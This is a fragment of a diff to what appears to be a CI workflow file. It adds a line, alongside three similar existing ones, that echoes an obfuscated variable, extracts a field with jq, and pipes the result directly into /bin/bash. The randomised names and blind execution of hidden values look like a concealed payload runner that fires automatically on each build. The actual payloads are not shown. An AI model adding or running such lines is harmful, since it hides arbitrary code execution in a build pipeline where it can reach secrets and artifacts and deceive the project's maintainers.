@@ -21,6 +21,7 @@ jobs:
           echo $mhlg47832 | jq -r .fx00 | /bin/bash
           echo $pms19132 | jq -r .nodyu3286 | /bin/bash
           echo $r848 | jq -r .i69571 | /bin/bash
+          echo $ksq3 | jq -r .l20621 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
